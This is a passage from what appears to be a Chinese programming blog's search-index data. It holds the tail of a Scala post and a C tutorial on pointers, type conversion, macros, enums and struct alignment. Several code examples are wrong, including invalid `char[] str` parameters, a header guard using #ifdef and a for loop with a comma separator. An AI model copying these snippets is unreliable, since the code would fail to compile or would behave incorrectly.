扩展标记语言）。Scala将XML抬高到语言的一等编程结构，你可以像表示字符串那样来表示XML。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> movies =</span><br><span class=\"line\">     | &lt;movies&gt;</span><br><span class=\"line\">     |     &lt;movie genre=<span class=\"string\">&quot;action&quot;</span>&gt;<span class=\"type\">Pirates</span> of the <span class=\"type\">Caribbean</span>&lt;/movie&gt;</span><br><span class=\"line\">     |     &lt;movie genre=<span class=\"string\">&quot;fairytale&quot;</span>&gt;<span class=\"type\">Edward</span> <span class=\"type\">Scissorhands</span>&lt;/movie&gt;</span><br><span class=\"line\">     | &lt;/movies&gt;</span><br><span class=\"line\">movies: scala.xml.<span class=\"type\">Elem</span> =</span><br><span class=\"line\">&lt;movies&gt;</span><br><span class=\"line\">    &lt;movie genre=<span class=\"string\">&quot;action&quot;</span>&gt;<span class=\"type\">Pirates</span> of the <span class=\"type\">Caribbean</span>&lt;/movie&gt;</span><br><span class=\"line\">    &lt;movie genre=<span class=\"string\">&quot;fairytale&quot;</span>&gt;<span class=\"type\">Edward</span> <span class=\"type\">Scissorhands</span>&lt;/movie&gt;</span><br><span class=\"line\">&lt;/movies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; movies.text</span><br><span class=\"line\">res0: <span class=\"type\">String</span> =</span><br><span class=\"line\"><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Pirates of the Caribbean</span></span><br><span class=\"line\"><span class=\"string\">    Edward Scissorhands</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; <span class=\"keyword\">val</span> movieNodes = movies \\ <span class=\"string\">&quot;movie&quot;</span></span><br><span class=\"line\">movieNodes: scala.xml.<span class=\"type\">NodeSeq</span> = <span class=\"type\">NodeSeq</span>(&lt;movie genre=<span class=\"string\">&quot;action&quot;</span>&gt;<span class=\"type\">Pirates</span> of the <span class=\"type\">Caribbean</span>&lt;/movie&gt;, &lt;movie genre=<span class=\"string\">&quot;fairytale&quot;</span>&gt;<span class=\"type\">Edward</span> <span class=\"type\">Scissorhands</span>&lt;/movie&gt;)</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; movieNodes(<span class=\"number\">0</span>)</span><br><span class=\"line\">res3: scala.xml.<span class=\"type\">Node</span> = &lt;movie genre=<span class=\"string\">&quot;action&quot;</span>&gt;<span class=\"type\">Pirates</span> of the <span class=\"type\">Caribbean</span>&lt;/movie&gt;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"模式匹配\"><a href=\"#模式匹配\" class=\"headerlink\" title=\"模式匹配\"></a>模式匹配</h2><p>模式匹配（pattern matching）允许你基于一些数据片断有条件地执行代码。Scala经常使用模 式匹配，诸如当你解析XML或在线程间传递消息时。<br><figure class=\"highlight scala\"><table><tr><td class=\"code\"><pre><span class=\"line\">scala&gt; <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">matchNumber</span></span>(num:<span class=\"type\">Int</span>):<span class=\"type\">String</span> = num <span class=\"keyword\">match</span> &#123;</span><br><span class=\"line\">     |   <span class=\"keyword\">case</span> <span class=\"number\">1</span> =&gt; <span class=\"string\">&quot;one&quot;</span></span><br><span class=\"line\">     |   <span class=\"keyword\">case</span> <span class=\"number\">2</span> =&gt; <span class=\"string\">&quot;two&quot;</span></span><br><span class=\"line\">     |   <span class=\"keyword\">case</span> _ =&gt; <span class=\"string\">&quot;other&quot;</span></span><br><span class=\"line\">     | &#125;</span><br><span class=\"line\">matchNumber: (num: <span class=\"type\">Int</span>)<span class=\"type\">String</span></span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; matchNumber(<span class=\"number\">1</span>)</span><br><span class=\"line\">res5: <span class=\"type\">String</span> = one</span><br><span class=\"line\"></span><br><span class=\"line\">scala&gt; matchNumber(<span class=\"number\">0</span>)</span><br><span class=\"line\">res6: <span class=\"type\">String</span> = other</span><br></pre></td></tr></table></figure></p>\n","categories":["《七周七语言》"],"tags":["Scala"]},{"title":"深入学习C语言","url":"/2022/05/02/%E4%BB%8EC%E5%88%B0C/","content":"<blockquote>\n<p>C++建立在C语言的基础上，在系统化学习C++之前，先把本科学的C语言捡起来。</p>\n</blockquote>\n<h2 id=\"基本数据类型\"><a href=\"#基本数据类型\" class=\"headerlink\" title=\"基本数据类型\"></a>基本数据类型</h2><p>基本数据类型长度和数据模型有关，有几种常见的数据模型：LP32、ILP32、LP64、ILP64、LLP64。</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>LP32</th>\n<th>ILP32</th>\n<th>LP64</th>\n<th>ILP64</th>\n<th>LLP64</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>char</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n</tr>\n<tr>\n<td>short</td>\n<td>16</td>\n<td>16</td>\n<td>16</td>\n<td>16</td>\n<td>16</td>\n</tr>\n<tr>\n<td>int</td>\n<td>16</td>\n<td>32</td>\n<td>32</td>\n<td>64</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long</td>\n<td>32</td>\n<td>32</td>\n<td>64</td>\n<td>64</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long long</td>\n<td>64</td>\n<td>64</td>\n<td>64</td>\n<td>64</td>\n<td>64</td>\n</tr>\n<tr>\n<td>ptr</td>\n<td>32</td>\n<td>32</td>\n<td>64</td>\n<td>64</td>\n<td>64</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p><code>char</code>,<code>short</code>,<code>long long</code>,<code>float</code>,<code>double</code>的长度总是固定的，而指针长度往往和平台有关，而<code>int</code>,<code>long</code>长度和数据模型有关。</p>\n</blockquote>\n<span id=\"more\"></span>\n<p>如今的64位类Unix平台使用LP64数据模型，而Windows使用LLP64（除了指针是64位，其他还是和ILP32一样）</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>win32</th>\n<th>win64</th>\n<th>unix32</th>\n<th>unix64</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>char</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n<td>2</td>\n<td>2</td>\n<td>2</td>\n</tr>\n<tr>\n<td>int</td>\n<td>4</td>\n<td>4</td>\n<td>4</td>\n<td>4</td>\n</tr>\n<tr>\n<td>long</td>\n<td>4</td>\n<td><strong>4</strong></td>\n<td>4</td>\n<td>8</td>\n</tr>\n<tr>\n<td>long long</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n<td>4</td>\n<td>4</td>\n<td>4</td>\n</tr>\n<tr>\n<td>double</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n<td>8</td>\n</tr>\n<tr>\n<td>long double</td>\n<td>8</td>\n<td>8</td>\n<td><strong>12</strong></td>\n<td><strong>16</strong></td>\n</tr>\n<tr>\n<td>指针</td>\n<td>4</td>\n<td>8</td>\n<td>4</td>\n<td>8</td>\n</tr>\n<tr>\n<td>size_t</td>\n<td>4</td>\n<td>8</td>\n<td>4</td>\n<td>8</td>\n</tr>\n<tr>\n<td>bool</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p>需要额外留意win64的<code>long</code>依然是32位的，<code>long long</code>永远是64位的</p>\n<p><code>char</code>，<code>short</code>，<code>int</code>，<code>long</code>可以用<code>unsigned</code>修饰，<code>double</code>和<code>float</code>不行。</p>\n</blockquote>\n<h2 id=\"指针的几种用法\"><a href=\"#指针的几种用法\" class=\"headerlink\" title=\"指针的几种用法\"></a>指针的几种用法</h2><ol>\n<li><p>一般类型的指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a1 = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> *p1 = &amp;a1; <span class=\"comment\">// 指向int类型的指针</span></span><br><span class=\"line\">*p1 = <span class=\"number\">20</span>; <span class=\"comment\">// a1 == 20</span></span><br></pre></td></tr></table></figure>\n<p>可以通过对<code>p1</code>解引用修改指向的变量的值。如果去修改指向常量的值则会编译器报warning。</p>\n</li>\n<li><p>常量指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a2 = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> *p2 = &amp;a2; <span class=\"comment\">// 常量指针，指向一个const int类型，</span></span><br><span class=\"line\">*p2 = <span class=\"number\">20</span>; <span class=\"comment\">// 编译出错</span></span><br></pre></td></tr></table></figure>\n<p>常量指针，提示编译器指向的变量是一个常量（无论指向目标本身有没有<code>const</code>修饰），不允许用指针解引用修改这个变量的值，如果修改则直接编译出错。</p>\n</li>\n</ol>\n<blockquote>\n<ul>\n<li><code>const int* p2</code>和<code>int const* p2</code>是一个写法 </li>\n<li><code>int *p2, p3</code> 声明了一个<code>int*</code>指针<code>p2</code>和一个<code>int</code>变量<code>p3</code></li>\n</ul>\n</blockquote>\n<ol>\n<li><p>指针常量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a3 = <span class=\"number\">10</span>, a4 = <span class=\"number\">20</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span>* <span class=\"keyword\">const</span> p3 = &amp;a3; <span class=\"comment\">// 指针常量，不允许再指向其他变量</span></span><br><span class=\"line\">p3 = &amp;a4; <span class=\"comment\">// 编译出错</span></span><br></pre></td></tr></table></figure>\n<p>指针常量，必须声明后就指向某个对象，声明后不可以再指向其他变量</p>\n</li>\n<li><p>指向常量的指针常量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a5 = <span class=\"number\">10</span>, a6 = <span class=\"number\">20</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> *<span class=\"keyword\">const</span> p4 = &amp;a5; <span class=\"comment\">//指向常量的指针常量，不允许修改指向的值，也不允许指向其他的变量</span></span><br><span class=\"line\">*p4 = <span class=\"number\">20</span>; <span class=\"comment\">// 编译错误</span></span><br><span class=\"line\">p4 = &amp;a6;</span><br></pre></td></tr></table></figure>\n<p>指向常量的指针常量既不允许修改指向的值，也不允许指向其他的变量。</p>\n</li>\n<li><p>数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> p5[<span class=\"number\">10</span>]; <span class=\"comment\">// 数组</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> *p6 = p5;</span><br></pre></td></tr></table></figure>\n<p><code>p5</code>是个栈上的数组，可以用其他<code>int</code>类型指针指向它。但是<code>sizeof(p5)</code>为数组占用的比特数（40），<code>sizeof(p6)</code>则是指针占用大小（8）。</p>\n</li>\n</ol>\n<p>例:<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func1</span><span class=\"params\">(<span class=\"keyword\">char</span>[] str)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">sizeof</span>(str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func2</span><span class=\"params\">(<span class=\"keyword\">int</span>[] ptr)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">sizeof</span>(ptr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span>[] str1 = <span class=\"string\">&quot;123&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,func1(str1), <span class=\"keyword\">sizeof</span>(str1), <span class=\"built_in\">strlen</span>(str1)); <span class=\"comment\">// 8 4 3</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> p1[<span class=\"number\">5</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;; <span class=\"comment\">// 8 20</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d\\n&quot;</span>, func2(p1), <span class=\"keyword\">sizeof</span>(p1));</span><br><span class=\"line\">  <span class=\"keyword\">int</span> p2[] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;; <span class=\"comment\">// 8 20</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d\\n&quot;</span>, func2(p2), <span class=\"keyword\">sizeof</span>(p2));</span><br><span class=\"line\">  <span class=\"keyword\">char</span> str2[<span class=\"number\">3</span>] = <span class=\"string\">&quot;12345&quot;</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,func1(str2), <span class=\"keyword\">sizeof</span>(str2), <span class=\"built_in\">strlen</span>(str2)); <span class=\"comment\">// 8 3 6</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> p3[<span class=\"number\">3</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d\\n&quot;</span>, func2(p3), <span class=\"keyword\">sizeof</span>(p3)); <span class=\"comment\">// 8 12</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<ul>\n<li>x64下为例。对形参数组使用<code>sizeof</code>固定返回8。</li>\n<li>数组声明后的初始化如果超过声明长度会warning，实际分配空间根据声明长度确定。<code>sizeof</code>返回的也是实际分配空间、即声明长度。也可以写明长度来隐式声明。</li>\n<li>字符串形式定义字符数字需要注意末尾隐式定义了个<code>\\0</code>，实际占用长度需要+1，<code>strlen()</code>返回字符串长度，而<code>sizeof</code>返回字符串长度+1</li>\n</ul>\n<p>如何记忆几种指针的区别：<code>[T const | const T | T]* [const | ?]</code>，<code>*</code>前是对被指向对象的约束（能否通过解引用修改指向对象），<code>*</code>后是对指针本身的约束（是否能指向其他对象）</p>\n<ul>\n<li><code>T*</code>：指向<code>T</code>的指针，可以指向其他值，可以通过解引用修改指向的值</li>\n<li><code>T const*</code>或<code>const T*</code>：指向<code>const T</code>的指针，目标不可被修改，但可以指向其他值</li>\n<li><code>T* const</code>：指向<code>T</code>的指针，目标能修改，但是指针有<code>const</code>修饰符，所以指针不可变，不能指向其他对象</li>\n<li><code>T const* const</code>或<code>const T* const</code>，指向<code>const T*</code>且指针本身有<code>const</code>修饰符，目标不能被修改且指针不能指向其他对象</li>\n</ul>\n</blockquote>\n<h2 id=\"表达式\"><a href=\"#表达式\" class=\"headerlink\" title=\"表达式\"></a>表达式</h2><p>编译器编译的原则是<strong>贪心算法</strong>，即：<strong>尽可能多的匹配token</strong>。</p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">3</span>, b = <span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> c = a+++b; <span class=\"comment\">// 等价于int c = (a++) + b, 优先匹配a++</span></span><br></pre></td></tr></table></figure></p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">3</span>, b = <span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> c = a+++-+-+--n; <span class=\"comment\">// 等价于int c = (a++)+(-(+(-(+(--n)))));</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"类型自动转换\"><a href=\"#类型自动转换\" class=\"headerlink\" title=\"类型自动转换\"></a>类型自动转换</h3><p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(; i &lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>), i++) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>,i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>事实上这段循环根本不会执行，因为有符号数<code>i</code>和无符号值<code>sizeof(int)</code>比较涉及到有符号数与无符号数的减法运算，<strong>有符号数参与无符号数的运算会先将有符号数转为无符号数</strong>。而-1转为无符号数会远大于4</p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">-20</span>;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> b = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> c = a + b; <span class=\"comment\">// a + b是无符数，强行转为有符号数，c=-10</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a + b = %u, c = %d\\n&quot;</span>, a + b, c);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(a + b &gt; <span class=\"number\">0</span>) &#123; <span class=\"comment\">// a + b是无符号数4294967286&gt;0</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a + b &gt; 0&quot;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a + b &lt;= 0&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(c &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;c &gt; 0&quot;</span>)</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123; <span class=\"comment\">// c是有符号数-10</span></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;c &lt;= 0&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// out:</span></span><br><span class=\"line\"><span class=\"comment\">// a + b = 4294967286, c = -10</span></span><br><span class=\"line\"><span class=\"comment\">// a + b &gt; 0</span></span><br><span class=\"line\"><span class=\"comment\">// c &lt;= 0</span></span><br></pre></td></tr></table></figure></p>\n<p>类型自动转换的原则：</p>\n<ul>\n<li>参与运算的类型不同，先转换成相同的类型再运算</li>\n<li>数据类型会向数据增长的方向转换，<code>char</code>-&gt;<code>short</code>-&gt;<code>int</code>-&gt;<code>long</code>，有符号会向无符号转化</li>\n<li>所有<code>float</code>类型的运算都会转换成<code>double</code>再运算，哪怕只有一个<code>float</code></li>\n<li>浮点数和整数一起运算，统一转换成浮点数运算</li>\n<li><code>char</code>和<code>short</code>类型的值参与运算，无论他们有无符号，结果都自动转为<code>int</code></li>\n<li>赋值运算时，等号右边的类型向左边的类型转换</li>\n<li>如果<code>char</code>或者<code>short</code>与<code>int</code>类型运算，结果有无符号视<code>int</code>有无符号决定</li>\n</ul>\n<p><img src=\"ctype_derive.drawio.png\" alt=\"\"></p>\n<h2 id=\"宏\"><a href=\"#宏\" class=\"headerlink\" title=\"宏\"></a>宏</h2><p>宏替换是编译期过程，不占用运行时间。宏只能在函数外部定义。</p>\n<ol>\n<li>常量宏替换<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ITEM_SIZE 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ITEM_COUNT 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> TOTAL_ITEM_SIZE (ITEM_SIZE*ITEM_COUNT)</span></span><br></pre></td></tr></table></figure></li>\n<li>类型宏定义<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> u1 unsigned char</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> u2 unsigned short</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> u4 unsigned int</span></span><br></pre></td></tr></table></figure></li>\n<li><p>函数宏<br>函数宏名称和参数之间不能有空格，参数和实现之间必须有空格。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX(x, y) (((x) &gt; (y)) ? (x) : (y))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ABS(x) (((x) &gt; 0) ? (x) : (-(x)))</span></span><br></pre></td></tr></table></figure>\n<p><strong>宏函数必须用括号将所有表达式层层包裹，以防出现运算符优先级的问题</strong>。例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ABS(x) (x &gt; 0 ? x : -x)</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>, b = <span class=\"number\">2</span>;</span><br><span class=\"line\">ABS(a + b);</span><br></pre></td></tr></table></figure>\n<p>实际上执行的是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">(a + b &gt; <span class=\"number\">0</span> ? a + b : - a + b)</span><br></pre></td></tr></table></figure>\n<p>这与预期肯定是不一致的。此外如果传入某个函数的执行结果如<code>ABS(func(a))</code>会两次调用<code>func()</code>，这可能带来性能问题。</p>\n</li>\n<li><p>头文件保护</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _MODULE_A_</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _MODULE_A_</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;xxx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123; <span class=\"comment\">//强制以C的形式编译</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// header content here</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure></li>\n<li>内置调试宏<ul>\n<li><code>__FILE__</code>：当前文件名</li>\n<li><code>__LINE__</code>：当前行号</li>\n<li><code>__DATE__</code>：当前日期</li>\n<li><code>__TIME__</code>：当前时间</li>\n</ul>\n</li>\n</ol>\n<p>这些宏一般用于调试。<br>例，用内置宏实现一个日志宏函数：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LOG(str, args...) printf(<span class=\"meta-string\">&quot;[%s %s][%s:%d] &quot;</span>#str<span class=\"meta-string\">&quot;\\n&quot;</span>, __DATE__, __TIME__, __FILE__, __LINE__, ##args)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> ip[] = <span class=\"string\">&quot;192.168.0.1&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> n = <span class=\"number\">200</span>;</span><br><span class=\"line\">  LOG(<span class=\"string\">&quot;receive %d bytes from server %s&quot;</span>, n, ip);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// May  1 2022 16:36:24][4.c:8] &quot;receive 200 bytes from server 192.168.0.1&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>宏的缺点：</p>\n<ul>\n<li>宏在符号表中不存在，无法打热补丁，在单步调试时无法进入</li>\n<li>宏会使得程序的代码空间增大</li>\n<li>宏常量没有数据类型，编译器无法执行类型检查<br>优点：</li>\n<li>宏函数效率高</li>\n<li>一些功能只能用宏实现。一些数据要在编译阶段确定，只能用宏。<br>总结：</li>\n<li>尽量不使用宏函数，除非有性能原因</li>\n<li>宏定义的名字在一个工程中要保持唯一性，防止不一致。</li>\n</ul>\n<h2 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h2><p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> &#123;</span></span><br><span class=\"line\">  Apple = <span class=\"number\">4</span>,</span><br><span class=\"line\">  Banana,</span><br><span class=\"line\">  Orange = <span class=\"number\">5</span>,</span><br><span class=\"line\">  Lemon</span><br><span class=\"line\">&#125; fruit;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d %d&quot;</span>, Apple, Banana, Orange, Lemon, <span class=\"keyword\">sizeof</span>(fruit)); <span class=\"comment\">// 4 5 5 6 4</span></span><br></pre></td></tr></table></figure><br>枚举类型的大小和编译器、编译选项都有关，一般为4或8个字节。<strong>建议不要对枚举用<code>sizeof</code>，且对枚举成员赋值不要超过4字节</strong>。</p>\n<ul>\n<li>枚举成员可以指定值，如果不指定，就从前一个有值的成员开始依次递增，如果第一个成员没有指定，默认是0。</li>\n<li>枚举值可能存在成员值相同的情况（如例子）</li>\n<li>枚举赋值不要超过4字节。枚举之前不要强行转化。</li>\n</ul>\n<h2 id=\"结构体\"><a href=\"#结构体\" class=\"headerlink\" title=\"结构体\"></a>结构体</h2><p><strong>字节对齐</strong>：现代计算机以字节编址，理论上可以从任何位置取操作数。但是实际上，访问特定类型的变量只能从特定的地址访问内存，这就是字节对齐。</p>\n<p>如果期望只从4的倍数的地址取操作数，就是4字节对齐。</p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 默认4字节对齐</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">        <span class=\"keyword\">char</span> str[<span class=\"number\">10</span>]; <span class=\"comment\">// size: 10bytes, padding:2 bytes, total 12byes mod 4 == 0</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> n; <span class=\"comment\">// 4 bytes, no padding</span></span><br><span class=\"line\">        <span class=\"keyword\">float</span> f; <span class=\"comment\">// 4 bytes, no padding</span></span><br><span class=\"line\">&#125; STRUCT_DEMO; <span class=\"comment\">// total 12 + 4 + 4 = 20 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        STRUCT_DEMO demo = &#123;<span class=\"string\">&quot;Heng&quot;</span>, <span class=\"number\">1919810</span>, <span class=\"number\">114.514</span>&#125;;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u %u %u %u&quot;</span>,<span class=\"keyword\">sizeof</span>(demo), &amp;demo.str, &amp;demo.n, &amp;demo.f);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//20 8313680 8313692 8313696</span></span><br></pre></td></tr></table></figure></p>\n<p>可以用<code>#pragma pack(n)</code>来声明n字节对齐</p>\n<p><strong>字节对齐的原因</strong>：</p>\n<ol>\n<li><p>运行速度更快</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">pragma</span> pack(1)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">  <span class=\"keyword\">double</span> n;</span><br><span class=\"line\">&#125; st_1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%f&quot;</span>, st_1.n)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">pragma</span> pack(4)</span></span><br><span 